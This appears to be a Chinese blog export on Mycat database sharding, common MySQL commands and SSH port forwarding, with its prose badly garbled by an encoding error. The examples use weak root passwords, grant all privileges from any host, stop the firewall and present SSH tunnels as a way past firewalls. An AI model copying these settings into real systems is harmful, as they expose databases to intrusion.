12345678910111213141516171819202122232425262728293031323334&lt;!--Ê≠§Â§ÑÂÆö‰πâÁöÑÁî®Êà∑Ôºå‰∏∫ClientËøûÊé•MycatÁöÑÁî®Êà∑ÂØÜÁ†ÅÔºåÂèØ‰ª•ÈÖçÁΩÆÁõ∏ÂÖ≥Êï∞ÊçÆÂ∫ìÂèäË°®ËØªÂÜôÁöÑÊùÉÈôêÔºå--&gt; &lt;user name="root"&gt; &lt;property name="password"&gt;test&lt;/property&gt; &lt;property name="schemas"&gt;TESTDB&lt;/property&gt; &lt;!--&lt;property name="readOnly"&gt;true&lt;/property&gt;--&gt; &lt;/user&gt; &lt;!-- Ë°®Á∫ß DML ÊùÉÈôêËÆæÁΩÆ --&gt; &lt;!-- &lt;privileges check="false"&gt; &lt;schema name="TESTDB" dml="0110" &gt; &lt;table name="tb01" dml="0000"&gt;&lt;/table&gt; &lt;table name="tb02" dml="1111"&gt;&lt;/table&gt; &lt;/schema&gt; &lt;/privileges&gt; --&gt;&lt;!--Ê≠§Â§ÑÂÆö‰πâËøûÊé•IPÁôΩÂêçÂçïÂíå SQL ÈªëÂêçÂçï--&gt; &lt;!-- ÂÖ®Â±ÄSQLÈò≤ÁÅ´Â¢ôËÆæÁΩÆ --&gt; &lt;!-- &lt;firewall&gt; &lt;whitehost&gt; &lt;host user="mycat" host="127.0.0.1"&gt;&lt;/host&gt; ip ÁôΩÂêçÂçï Áî®Êà∑ÂØπÂ∫îÁöÑÂèØ‰ª•ËÆøÈóÆÁöÑ ip Âú∞ÂùÄ &lt;/whitehost&gt; &lt;blacklist check="true"&gt; &lt;property name="selelctAllow"&gt;false&lt;/property&gt; ÈªëÂêçÂçïÂÖÅËÆ∏ÁöÑ ÊùÉÈôê ÂêéÈù¢‰∏∫ÈªòËÆ§ &lt;/blacklist&gt; &lt;/firewall&gt; --&gt;# ÈÖçÁΩÆÈÄªËæëÂ∫ìË°®ÔºåÂàÜÁâáÂÆö‰πâÁºñËæëÈÄªËæëÂ∫ìÂÆö‰πâÂíåË°®‰ª•ÂèäÂàÜÁâáÂÆö‰πâÁöÑÈÖçÁΩÆÊñá‰ª∂vim conf/schema.xmlÂêåÊ†∑ÂÖàÂ§á‰ªΩ‰∏Ä‰ªΩcp conf/schema.xml conf/schema.xml.bakÁºñËæë‰∏∫Â¶Ç‰∏ãÂÜÖÂÆπ ÊúâÂ¶Ç‰∏ãË°®ÁªìÊûÑÔºö 12345678910111213+--------------------+-------+------------------------+--------------------+| ID | LEVEL | EXTEND_ATTR | UID |+--------------------+-------+------------------------+--------------------+| 298599220716244992 | 1 | &#123;&#125; | 298321762779664384 || 298600412901019648 | 0 | &#123;&#125; | 298321762779664384 || 298682157746884608 | 3 | &#123;"129":2&#125; | 298667788531142656 || 298684200884637696 | 2 | &#123;&#125; | 298667788531142656 || 298685806279659520 | 2 | &#123;&#125; | 298667788531142656 || 298686594007699456 | 2 | &#123;&#125; | 298667788531142656 || 298687219567169536 | 2 | &#123;&#125; | 298667788531142656 || 298688215626289152 | 1 | &#123;&#125; | 298667788531142656 || 298689820996145152 | 1 | &#123;&#125; | 298667788531142656 |+--------------------+-------+------------------------+--------------------+ ËøôÈáåÈÄâÊã©Ê†πÊçÆUIDËøõË°åÊ∞¥Âπ≥ÂàáÂàÜÔºåÈÖçÁΩÆÊñá‰ª∂Â¶Ç‰∏ãÔºö 123456789101112131415161718192021222324&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE mycat:schema SYSTEM "schema.dtd"&gt;&lt;mycat:schema xmlns:mycat="http://io.mycat/"&gt; &lt;!--ÂÆö‰πâÈÄªËæëÊï∞ÊçÆÂ∫ìTESTDBÔºåÈÄªËæëË°®t_rune,‰∏ªÈîÆ„ÄÅÂàáÂàÜËßÑÂàô(mod-long)ÔºåÂíåÊï∞ÊçÆÂ∫ìËäÇÁÇπ(dn2,dn2,dn3)--&gt; &lt;schema name="TESTDB" checkSQLschema="false" sqlMaxLimit="100"&gt; &lt;table name="t_rune" primaryKey="uid" dataNode="dn2,dn2,dn3" rule="mod-long" &gt; &lt;/table&gt; &lt;/schema&gt; &lt;!--ÂÆö‰πâÊØè‰∏™Êï∞ÊçÆÂ∫ìËäÇÁÇπÁõ∏ÂÖ≥‰ø°ÊÅØ--&gt; &lt;dataNode name="dn2" dataHost="server1" database="db1" /&gt; &lt;dataNode name="dn2" dataHost="server1" database="db2" /&gt; &lt;dataNode name="dn3" dataHost="server1" database="db3" /&gt; &lt;!--Á≠âÂêå‰∫é‰ª•‰∏äÈÖçÁΩÆ&lt;dataNodename=‚Äúdn$1-3‚Äù dataHost=‚Äúserver1‚Äù database=‚Äúdb$1-3‚Äù/&gt; --&gt; &lt;!--ÂÆö‰πâ‰∏ªÊú∫‰ø°ÊÅØÔºåÂèäMysqlÁî®Êà∑ÂØÜÁ†Å--&gt; &lt;dataHost name="server1" maxCon="1000" minCon="10" balance="0" writeType="0" dbType="mysql" dbDriver="native" switchType="1" slaveThreshold="100"&gt; &lt;!--ÂøÉË∑≥Ê£ÄÊµãËØ≠Âè•--&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;!-- ËøúÁ®ãÊï∞ÊçÆÂ∫ìÈÖçÁΩÆ‰ø°ÊÅØ --&gt; &lt;writeHost host="192.168.99.21" url="192.168.99.214:3306" user="root" password="root"&gt; &lt;/writeHost&gt; &lt;/dataHost&gt;&lt;/mycat:schema&gt; Êó†ËÆ∫ÂàÜÁâá‰∏éÂê¶,ÊØèÂº†Ë°®ÈÉΩÈúÄË¶ÅÂÆö‰πâ, Áîü‰∫ß,‰æã: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE mycat:schema SYSTEM "schema.dtd"&gt;&lt;mycat:schema xmlns:mycat="http://io.mycat/"&gt; &lt;schema name="bigduck" checkSQLschema="true" sqlMaxLimit="100"&gt; &lt;!--ÂàÜ--&gt; &lt;!--t_shop_visible--&gt; &lt;table name="t_shop_visible" primaryKey="ID" dataNode="dn$1-15" rule="mod-long"&gt; &lt;/table&gt; &lt;!--t_friendlog--&gt; &lt;table name="t_friendlog" primaryKey="ID" dataNode="dn$1-15" rule="mod-long"&gt; &lt;/table&gt; &lt;!--t_room--&gt; &lt;table name="t_room" primaryKey="ID" dataNode="dn$1-15" rule="mod-long"&gt; &lt;/table&gt; &lt;!--t_npc--&gt; &lt;table name="t_npc" primaryKey="ID" dataNode="dn$1-15" rule="mod-long"&gt; &lt;/table&gt; &lt;!--t_arena_fight--&gt; &lt;table name="t_arena_fight" primaryKey="ID" dataNode="dn$1-15" rule="mod-long"&gt; &lt;/table&gt; &lt;!--‰∏çÂàÜ--&gt; &lt;!--alliance_id--&gt; &lt;table name="alliance_id" primaryKey="seq_id" dataNode="dn2"&gt; &lt;/table&gt; &lt;!--t_alliance_boss--&gt; &lt;table name="t_alliance_boss" primaryKey="ALLIANCEID" dataNode="dn2"&gt; &lt;/table&gt; &lt;!--t_alliance_boss_id--&gt; &lt;table name="t_alliance_boss_id" primaryKey="ALLIANCEID" dataNode="dn2"&gt; &lt;/table&gt; &lt;!--t_alliance_boss_log--&gt; &lt;table name="t_alliance_boss_log" primaryKey="ID" dataNode="dn2"&gt; &lt;/table&gt; &lt;!--t_alliance_member_boss--&gt; &lt;table name="t_alliance_member_boss" primaryKey="UID" dataNode="dn2"&gt; &lt;/table&gt; &lt;!-- global table is auto cloned to all defined data nodes ,so can join with any table whose sharding node is in the same data node --&gt; &lt;!--ÂÖ®Â±ÄË°®--&gt; &lt;!--t_arena--&gt; &lt;table name="t_arena" primaryKey="UID" type="global" dataNode="dn2"&gt; &lt;/table&gt; &lt;/schema&gt; &lt;dataNode name="dn$1-5" dataHost="mysql-server-01" database="db$11-15" /&gt; &lt;dataNode name="dn$6-10" dataHost="mysql-server-02" database="db$21-25" /&gt; &lt;dataNode name="dn$11-15" dataHost="mysql-server-03" database="db$31-35" /&gt; &lt;dataHost name="mysql-server-01" maxCon="2000" minCon="100" balance="0" dbType="mysql" dbDriver="native"&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;writeHost host="172.17.0.2" url="172.17.0.2:3306" user="root" password="pa33w0rd"&gt; &lt;/writeHost&gt; &lt;/dataHost&gt; &lt;dataHost name="mysql-server-02" maxCon="2000" minCon="100" balance="0" dbType="mysql" dbDriver="native"&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;writeHost host="172.17.0.3" url="172.17.0.3:3306" user="root" password="pa33w0rd"&gt; &lt;/writeHost&gt; &lt;/dataHost&gt; &lt;dataHost name="mysql-server-03" maxCon="2000" minCon="100" balance="0" dbType="mysql" dbDriver="native"&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;writeHost host="172.17.0.4" url="172.17.0.4:3306" user="root" password="pa33w0rd"&gt; &lt;/writeHost&gt; &lt;/dataHost&gt;&lt;/mycat:schema&gt; ÈÖçÁΩÆÂàáÁâáËßÑÂàôÂú®‰∏äÊ≠•ÁöÑschema.xmlÊñá‰ª∂‰∏≠ÂÆö‰πâ‰∫ÜÂàÜÁâáËßÑÂàôÔºörule=&quot;mod-long&quot;Ê≠§Êó∂ÁºñËæëconf/rule.xmlÊñá‰ª∂Ê∑ªÂä†ÂàÜÁâáËßÑÂàôÁöÑÂÖ∑‰ΩìÂèÇÊï∞‰ø°ÊÅØ 123456789101112131415161718192021222324252627 &lt;tableRule name="mod-long"&gt; &lt;rule&gt; &lt;columns&gt;uid&lt;/columns&gt; &lt;algorithm&gt;mod-long&lt;/algorithm&gt; &lt;/rule&gt; &lt;/tableRule&gt;&lt;!-- name Â±ûÊÄßÊåáÂÆöÂîØ‰∏ÄÁöÑÂêçÂ≠óÔºåÁî®‰∫éÊ†áËØÜ‰∏çÂêåÁöÑË°®ËßÑÂàô„ÄÇ ÂÜÖÂµåÁöÑ rule Ê†áÁ≠æÂàôÊåáÂÆöÂØπÁâ©ÁêÜË°®‰∏≠ÁöÑÂì™‰∏ÄÂàóËøõË°åÊãÜÂàÜÂíå‰ΩøÁî®‰ªÄ‰πàË∑ØÁî±ÁÆóÊ≥ï„ÄÇ columns ÂÜÖÊåáÂÆöË¶ÅÊãÜÂàÜÁöÑÂàóÂêçÂ≠ó„ÄÇ algorithm ‰ΩøÁî® function Ê†áÁ≠æ‰∏≠ÁöÑ name Â±ûÊÄß„ÄÇËøûÊé•Ë°®ËßÑÂàôÂíåÂÖ∑‰ΩìË∑ØÁî±ÁÆóÊ≥ï„ÄÇÂΩìÁÑ∂ÔºåÂ§ö‰∏™Ë°®ËßÑÂàôÂèØ‰ª•ËøûÊé•Âà∞ Âêå‰∏Ä‰∏™Ë∑ØÁî±ÁÆóÊ≥ï‰∏ä„ÄÇtable Ê†áÁ≠æÂÜÖ‰ΩøÁî®„ÄÇËÆ©ÈÄªËæëË°®‰ΩøÁî®Ëøô‰∏™ËßÑÂàôËøõË°åÂàÜÁâá„ÄÇ--&gt; &lt;function name="mod-long" class="io.mycat.route.function.PartitionByMod"&gt; &lt;!--Ê≥®ÊÑèÔºÅËøôÈáåÂ°´ÂÜôÊï∞ÊçÆÂ∫ìËäÇÁÇπÊï∞ÔºåÂê¶ÂàôÊó†Ê≥ïÂàÜÁâá--&gt; &lt;property name="count"&gt;3&lt;/property&gt; &lt;/function&gt;&lt;!-- name ÊåáÂÆöÁÆóÊ≥ïÁöÑÂêçÂ≠ó„ÄÇ class Âà∂ÂÆöË∑ØÁî±ÁÆóÊ≥ïÂÖ∑‰ΩìÁöÑÁ±ªÂêçÂ≠ó„ÄÇÔºàÊ≠§Â§Ñ‰ΩøÁî®Ê±ÇÊ®°Ê≥ïÔºâ property ‰∏∫ÂÖ∑‰ΩìÁÆóÊ≥ïÈúÄË¶ÅÁî®Âà∞ÁöÑ‰∏Ä‰∫õÂ±ûÊÄß„ÄÇ--&gt; ÂÖ∑‰ΩìÂàáÁâáÁÆóÊ≥ïËßÑÂàôÔºöMycatÂàáÁâáÁÆóÊ≥ïËßÑÂàôËØ¶Ëß£ 0x02 ÈÖçÁΩÆÊï∞ÊçÆÂ∫ìËäÇÁÇπÈÖçÁΩÆserver1Êï∞ÊçÆÂ∫ìÔºåÁî®Êà∑ÂØÜÁ†Å‰∏∫schema.xmlÊñá‰ª∂‰∏≠ÈÖçÁΩÆÁõ∏ÂêåÔºåÂπ∂ÂÖÅËÆ∏server2ËøêÁ®ãËøûÊé• 12grant all privileges on *.* to 'root'@'192.168.99.216' identified by 'root' with grant option;flush privileges; ÂàõÂª∫ÈÖçÁΩÆÊñá‰ª∂‰∏≠Êï∞ÊçÆÂ∫ìËäÇÁÇπdb1,db2.db3 123create database db1 character set utf8;create database db2 character set utf8;create database db3 character set utf8; ÊµãËØïÁéØÂ¢É‰∏≠Á°ÆËÆ§2Âè∞Êú∫Âô®Èò≤ÁÅ´Â¢ôÂÖ≥Èó≠server iptables stop ËøîÂõûÂà∞server1ÂêØÂä®Mycat 1234567891011121314cd /usr/local/mycat./bin/mycat start[root@Centos6-8-TestEnv mycat]# netstat -ntlpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:32000 0.0.0.0:* LISTEN 8613/java tcp 0 0 :::1984 :::* LISTEN 8613/java tcp 0 0 :::8066 :::* LISTEN 8613/java#Á°Æ‰øù8066Á´ØÂè£ÁõëÂê¨Ê≠§‰∏∫MycatÊúçÂä°Âô®ÈªòËÆ§Á´ØÂè£ tcp 0 0 :::60743 :::* LISTEN 8613/java tcp 0 0 :::43303 :::* LISTEN 8613/java tcp 0 0 :::9066 :::* LISTEN 8613/java 0x03 Êï∞ÊçÆËøÅÁßªÁºñËæë/etc/my.cnfÊ∑ªÂä†1234[mysqldump]max_allowed_packet = 16M#default-character-set = utf8mb4 mysqldumpÂØºÂÖ•Êä•ERROR 1153 (08S01) at line 1133809: Got a packet bigger than &#39;max_allowed_packet&#39; bytesÈîôËØØÔºåÂõ†‰∏∫MySQLÂÖÅËÆ∏ÁöÑÈªòËÆ§Â§ßÂ∞è‰∏∫1MB„ÄÇ Ê≥®ÊÑèÔºåMycatÂú®ÊâßË°åINSERTËØ≠Âè•Êó∂ÈúÄË¶ÅÂÆåÊï¥INSERTËØ≠Âè•(Áî®ÂàóÂêç) 123456mysqldump -uroot -p -c --skip-add-locks --skip-extended-insert --no-autocommit databaseName &gt; databaseName.sql# -c ÂèÇÊï∞‰∏çÂèØÂ∞ëÔºå-c, ÂÖ®Áß∞‰∏∫‚Äìcomplete-insert Ë°®Á§∫‰ΩøÁî®ÂÆåÊï¥ÁöÑ insert ËØ≠Âè•(Áî®ÂàóÂêçÂ≠ó)„ÄÇ# --skip-add-locks Ë°®Á§∫ÂØºÊï∞ÊçÆÊó∂‰∏çÂä†ÈîÅÔºåÂ¶ÇÊûúÂä†ÈîÅÊ∂âÂèäÂ§öÂàÜÁâáÊó∂ÂÆπÊòìÂØºËá¥Ê≠ªÈîÅ„ÄÇ# --skip-extended-insert Â∞ÜÊØèË°åÊï∞ÊçÆËæìÂá∫‰∏∫‰∏Ä‰∏™ÂçïÁã¨ÁöÑinsertËØ≠Âè•# --no-autocommit ÂèÇÊï∞Âú®ÊØè‰∏™Ë°®Ê†ºÊâÄÊúâÁöÑÊèíÂÖ•ËØ≠Âè•ÁöÑÂâçÂêéÂàÜÂà´Â¢ûÂä†SET autocommit = 0ÂíåCOMMITËØ≠Âè•„ÄÇÁõ∏ÊØîÊ≤°ÊúâËøô‰∏™ÂèÇÊï∞ÔºåÊèíÂÖ•ÈÄüÂ∫¶ËÉΩÂ∑ÆÂá∫Ëá≥Â∞ë200ÂÄçÔºåÂàÜÂà´ÊòØ10000QPSÂíå50QPS ÂØºÂÖ•Êï∞ÊçÆ 123mysql -uroot -ptest -h192.168.99.216 -P8006 TESTDB #ËøûÊé•Mycatsource /t_rune.sql #ÂØºÂÖ•Êï∞ÊçÆ ÊàêÂäüÂêéÂèØ‰ª•Âú®server2‰∏≠ÁúãÂà∞db1,db2.db3Â∑≤ÁªèÂ≠òÂÖ•Êï∞ÊçÆ„ÄÇÈîôËØØÊó•ÂøóÂú® logs/mycat.logÊñá‰ª∂‰∏≠ ËøûÊé•Mycat select * from table Êó∂ÔºåMycatÈªòËÆ§limit 100Ê≠§ÈÖçÁΩÆÂèØ‰ªéschema.xmlÊñá‰ª∂‰∏≠‰øÆÊîπsqlMaxLimit=&quot;100&quot;ÂÆö‰πâ 0x04 ‰ºöÁî®Âà∞ÁöÑsqlÊü•ËØ¢ÊâÄÊúâË°®ÁöÑ‰∏ªÈîÆ 1SELECT k.column_name,k.table_name FROM information_schema.table_constraints t JOIN information_schema.key_column_usage k USING (constraint_name,table_schema,table_name) WHERE t.constraint_type='PRIMARY KEY' AND t.table_schema='Êï∞ÊçÆÂ∫ì'; Êü•ËØ¢ÊâÄÊúâË°®ÁöÑËÆ∞ÂΩïÊï∞(Ë°åÊï∞) 123select table_name,table_rows from information_schema.tables where TABLE_SCHEMA = 'Êï∞ÊçÆÂ∫ì' order by table_rows desc;#ÂØπ‰∫éInnoDBË°®Ôºåtable_rowsË°åËÆ°Êï∞‰ªÖÊòØÂ§ßÊ¶Ç‰º∞ËÆ°ÂÄº„ÄÇ]]></content>
      <categories>
        <category>Êï∞ÊçÆÂ∫ì</category>
        <category>Mycat</category>
      </categories>
      <tags>
        <tag>Mycat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Â∏∏Áî®MysqlËØ≠Âè•]]></title>
    <url>%2F2017%2F03%2F14%2Fmysql-sql%2F</url>
    <content type="text"><![CDATA[Á∫™ÂΩïËøêÁª¥ËøáÁ®ãÂ∏∏Áî®ÁöÑsqlË™ûÂè•ÔºåÂ§áÂøò ÂàõÂª∫Êï∞ÊçÆÂ∫ì CREATE DATABASE test CHARACTER SET UTF8; Â≠óÁ¨¶ÈõÜ‰∏∫UTF8 0x01 Áî®Êà∂ÂØÜÁ†ÅÂèäÁôªÈôÜÁõ∏ÂÖ≥1. Êõ¥ÊîπÂØÜÁ†Å12update user set password=password('root') where user='root';flush privileges; 2. ÂÖÅËÆ∏ËøúÁ®ãÁôªÂΩï12grant all privileges on *.* to 'username'@'%' identified by 'password' with grant option;flush privileges; 3. Êõ¥ÊîπMysqlÁõëÂê¨Âú∞ÂùÄ123vim /etc/my.cnf#Âú®[mysqld]‰∏≠Ê∑ªÂä†bind-address=127.0.0.1 4. ÂàõÂª∫Áî®Êà∑123grant all privileges on database.tables to 'username'@'127.0.0.1' identified by 'password' with grant option;flush privileges;# all privileges ---- ÊâÄÊúâÊùÉÈôê(ÂèØÊåáÂÆöSELECT,DROP,UPDATE,INSTER....) 5. Êü•ËØ¢ÊâÄÊúâÁî®Êà∂Âü∫Êú¨‰ø°ÊÅØ1SELECT user,host,password FROM mysql.user;?? ÂàùÂßãÂÆâË£ùÊï∞ÊçÆÂ∫ì‰ΩøÁî®mysqladminËÆæÁΩÆÂØÜÁ†ÅÂêéÔºåÁõ¥Êé•‰ΩøÁî®mysql -uroot -ppasswd ÁôªÈôÜÊ≠£Â∏∏Ôºå‰ΩøÁî®mysql -uroot -ppasswd -h127.0.0.1Êä•Èîô:Access denied for user ‚Äòroot‚Äò@‚Äôhostname‚ÄôËÆæÁΩÆÂÖÅËÆ∏ËøúÁ®ãÁôªÈôÜ,‰ªçÁÑ∂Êä•ÈîôËøôÊó∂‰ΩøÁî®SELECT user,host,password FROM mysql.user;ËØ≠Âè•ËøõË°åÊü•ËØ¢+‚Äî‚Äî‚Äì+‚Äî‚Äî‚Äî‚Äî‚Äî-+‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî-+| root | localhost | 3E8000C2FA234A170531B9063518B3B479E7C47B || root | 127.0.0.1 | 2E9879C2FA764A1705567896B518B3B47324EA23 |+‚Äî‚Äî‚Äì+‚Äî‚Äî‚Äî‚Äî‚Äî-+‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî-+Êõ¥ÊîπÁÇ∫Áõ∏ÂêåÂç≥ÂèØ 0x02 Êï∞ÊçÆÂ¢ûÂà™ÊîπÊü•1. ÊâπÈáèÂà™Èô§ÂåπÈÖçÁöÑË°®123456789101112131415161718‰æãÔºö+-----------------------------+| userregin2017_03_01 || userregin2017_03_02 || userregin2017_03_03 || userregin2017_03_04 || userregin2017_03_05 || userregin2017_03_06 || userregin2017_03_07 || userregin2017_03_08 || userregin2017_03_09 || userregin2017_03_10 || userregin2017_03_11 || userregin2017_03_12 || userregin2017_03_13 |+-----------------------------+Select CONCAT( 'drop table ', table_name, ';' ) FROM information_schema.tables Where table_name LIKE 'userregin%';# ÂØºÂá∫ÁöÑÊï∞ÊçÆ‰ΩøÁî®vimÁºñËæëCtrl+v(ÈÄâÂèñ) &gt;&gt; Shift+i &gt;&gt; ÁºñËæë &gt;&gt; Esc &gt;&gt; ÊñπÂêëÈîÆ‰∏ã 2. Êü•ËØ¢Êï∞ÊçÆÂ∫ìÂ§ßÂ∞è1SELECT concat((SUM(DATA_LENGTH)+SUM(INDEX_LENGTH))/1024/1024,'MB') as data FROM information_schema.tables WHERE TABLE_SCHEMA='your_database'; 3. Êü•ËØ¢Ë°®Â§ßÂ∞è1SELECT concat((SUM(DATA_LENGTH)+SUM(INDEX_LENGTH))/1024/1024,'MB') as data FROM information_schema.tables WHERE TABLE_SCHEMA='your_database' and TABLE_NAME='your_table'; 4. Êü•ËØ¢Ë°®ÁªìÊûÑ1desc your_tableÔºõ 5. Êü•ËØ¢Âª∫Ë°®ËØ≠Âè•1show create table table_name; 6. Âà™Èô§Ê∏ÖÁ©∫Ë°®Êï∞ÊçÆÔºö 123delete from tableÔºõdelete from table where id=1;#Â∏¶ËßÑÂàôÊ∏ÖÈô§ 7. Êü•ËØ¢Ë°®‰∏≠NAMEÂ≠óÊÆµÊúâÂì™‰∫õÁ±ªÂûã1select NAME from t_user group by NAME; 0x03 Â§á‰ªΩËøòÂéüÂéãÁº©Â§á‰ªΩÔºö 1mysqldump -B -uroot -proot Your_database| gzip &gt; Your_database.sql.gz ÂéãÁº©ËøòÂéüÔºö 1gunzip &lt; Your_database.sql.gz | mysql -uroot -proot sqlÊñá‰ª∂ËøòÂéüÔºö 123mysql -uroot -prootuse Your_database;source /root/Your_database.sql;]]></content>
      <categories>
        <category>Mysql</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSHÁ´ØÂè£ËΩ¨Âèë]]></title>
    <url>%2F2017%2F01%2F09%2Flinux-ssh%2F</url>
    <content type="text"><![CDATA[ÈÄöËøáÊú¨ÊñáÁöÑ‰ªãÁªçÔºåËØªËÄÖÂèØ‰ª•‰ªé‰∏≠‰∫ÜËß£Âà∞Â¶Ç‰ΩïÂ∫îÁî® SSH Á´ØÂè£ËΩ¨ÂèëÊú∫Âà∂Êù•Ëß£ÂÜ≥Êó•Â∏∏Â∑•‰Ωú / ÁîüÊ¥ª‰∏≠ÁöÑ‰∏Ä‰∫õÈóÆÈ¢ò„ÄÇÂ≠¶‰ºöÂú®ÈùûÂÆâÂÖ®ÁéØÂ¢É‰∏ã‰ΩøÁî®Á´ØÂè£ËΩ¨ÂèëÊù•Âä†ÂØÜÁΩëÁªúÂ∫îÁî®Ôºå‰øùÊä§‰∏™‰∫∫ÈöêÁßÅ‰ª•ÂèäÈáçË¶ÅÂïÜ‰∏ö‰ø°ÊÅØ„ÄÇÂêåÊó∂‰πüËÉΩÂ§üÁî®Ê≠§ÊäÄÊúØËß£ÂÜ≥Â∑•‰Ωú‰∏≠‰∏Ä‰∫õÂ∏∏ËßÅÈóÆÈ¢òÔºå‰æãÂ¶ÇËß£ÂÜ≥Èò≤ÁÅ´Â¢ôÂèäÁΩëÁªúÂ∫îÁî®Êú¨Ë∫´Â∏¶Êù•ÁöÑ‰∏Ä‰∫õÈôêÂà∂„ÄÇ 0x01 Á´ØÂè£ËΩ¨ÂèëÊ¶ÇËø∞SSH ‰ºöËá™Âä®Âä†ÂØÜÂíåËß£ÂØÜÊâÄÊúâ SSH ÂÆ¢Êà∑Á´Ø‰∏éÊúçÂä°Á´Ø‰πãÈó¥ÁöÑÁΩëÁªúÊï∞ÊçÆ„ÄÇ‰ΩÜÊòØÔºåSSH ËøòÂêåÊó∂Êèê‰æõ‰∫Ü‰∏Ä‰∏™ÈùûÂ∏∏ÊúâÁî®ÁöÑÂäüËÉΩÔºåËøôÂ∞±ÊòØÁ´ØÂè£ËΩ¨Âèë„ÄÇÂÆÉËÉΩÂ§üÂ∞ÜÂÖ∂‰ªñ TCP Á´ØÂè£ÁöÑÁΩëÁªúÊï∞ÊçÆÈÄöËøá SSH ÈìæÊé•Êù•ËΩ¨ÂèëÔºåÂπ∂‰∏îËá™Âä®Êèê‰æõ‰∫ÜÁõ∏Â∫îÁöÑÂä†ÂØÜÂèäËß£ÂØÜÊúçÂä°„ÄÇËøô‰∏ÄËøáÁ®ãÊúâÊó∂‰πüË¢´Âè´ÂÅöÈößÈÅìÔºàtunnelingÔºâÔºåËøôÊòØÂõ†‰∏∫ SSH ‰∏∫ÂÖ∂‰ªñ TCP ÈìæÊé•Êèê‰æõ‰∫Ü‰∏Ä‰∏™ÂÆâÂÖ®ÁöÑÈÄöÈÅìÊù•ËøõË°å‰º†ËæìËÄåÂæóÂêç„ÄÇ ‰æãÂ¶ÇÔºåTelnetÔºåSMTPÔºåLDAP Ëøô‰∫õ TCP Â∫îÁî®ÂùáËÉΩÂ§ü‰ªé‰∏≠ÂæóÁõäÔºåÈÅøÂÖç‰∫ÜÁî®Êà∑ÂêçÔºåÂØÜÁ†Å‰ª•ÂèäÈöêÁßÅ‰ø°ÊÅØÁöÑÊòéÊñá‰º†Ëæì„ÄÇËÄå‰∏éÊ≠§ÂêåÊó∂ÔºåÂ¶ÇÊûúÊÇ®Â∑•‰ΩúÁéØÂ¢É‰∏≠ÁöÑÈò≤ÁÅ´Â¢ôÈôêÂà∂‰∫Ü‰∏Ä‰∫õÁΩëÁªúÁ´ØÂè£ÁöÑ‰ΩøÁî®Ôºå‰ΩÜÊòØÂÖÅËÆ∏ SSH ÁöÑËøûÊé•ÔºåÈÇ£‰πà‰πüÊòØËÉΩÂ§üÈÄöËøáÂ∞Ü TCP Á´ØÂè£ËΩ¨ÂèëÊù•‰ΩøÁî® SSH ËøõË°åÈÄöËÆØ„ÄÇ ÊÄªÁöÑÊù•ËØ¥ SSH Á´ØÂè£ËΩ¨ÂèëËÉΩÂ§üÊèê‰æõ‰∏§Â§ßÂäüËÉΩÔºö Âä†ÂØÜ SSH Client Á´ØËá≥ SSH Server Á´Ø‰πãÈó¥ÁöÑÈÄöËÆØÊï∞ÊçÆ„ÄÇ Á™ÅÁ†¥Èò≤ÁÅ´Â¢ôÁöÑÈôêÂà∂ÂÆåÊàê‰∏Ä‰∫õ‰πãÂâçÊó†Ê≥ïÂª∫Á´ãÁöÑ TCP ËøûÊé•„ÄÇ 0x02 Êú¨Âú∞ËΩ¨Âèë Â¶ÇÂõæ,Êàë‰ª¨ÂØπBÊú∫Âô®Ê≤°ÊúâÊìç‰ΩúÊùÉÈôêÔºåCÊú∫Âô®Ê¨≤ËÆøÈóÆBÊú∫Âô®Ôºå‰ΩÜÁî±‰∫éBÊú∫Âô®Êó†Â§ñÁΩëipÔºåÊâÄ‰ª•Êó†Ê≥ïËÆøÈóÆÔºå‰ΩÜAÊú∫Âô®ÂèØ‰ª•ÂíåBÔºåC‰∏§Âè∞Êú∫Âô®ÈÄö‰ø°ÔºàÊúâÂ§ñÁΩëipÂíåÂÜÖÁΩëipÔºâÔºåÊ≠§Êó∂‰ΩøÁî®SSHÂú®AÊú∫Âô®‰∏äÂÅöSSHÁ´ØÂè£Êú¨Âú∞ËΩ¨ÂèëÔºåÊù•ÂÆûÁé∞Â§ñÁΩëËÆøÈóÆÂÜÖÁΩëBÊú∫Âô® Â¶ÇÊûúËΩ¨ÂèëÂêéÁõëÂê¨ÁöÑipÂú∞ÂùÄ‰∏∫0.0.0.0ÔºåÂàôÈúÄË¶ÅÊõ¥ÊîπË∑≥ÊùøÊú∫ÁöÑsshdÈÖçÁΩÆÊñá‰ª∂vim /etc/ssh/sshd_configÊõ¥ÊîπGatewayPorts no &gt; GatewayPorts yes Âú®AÊú∫Âô®ÊâßË°åÔºö 123ssh -CfNgL 0.0.0.0:80:172.16.1.2:80 root@172.16.1.3 | | | | | A B C D E ËøôÈáåÊàë‰ª¨Êù•ÂàÜÊÆµËÆ≤Ëß£ÂëΩ‰ª§ÁöÑÊûÑÊàêÔºö AÔºö 